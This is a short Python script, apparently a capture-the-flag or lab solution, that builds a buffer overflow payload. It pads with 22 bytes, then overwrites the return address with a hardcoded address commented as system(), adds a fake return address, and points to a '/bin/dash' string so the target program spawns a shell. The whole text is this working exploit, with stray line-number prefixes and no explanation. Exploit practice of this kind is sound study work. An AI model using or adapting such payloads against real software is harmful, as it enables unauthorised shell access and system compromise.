import sys
2	
3	addr = 0x804fef0.to_bytes(4, "little") #system address
4	addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
5	sys.stdout.buffer.write(b"A" * 22 + addr + b"f"*4 + addr2 + b"/bin/dash")
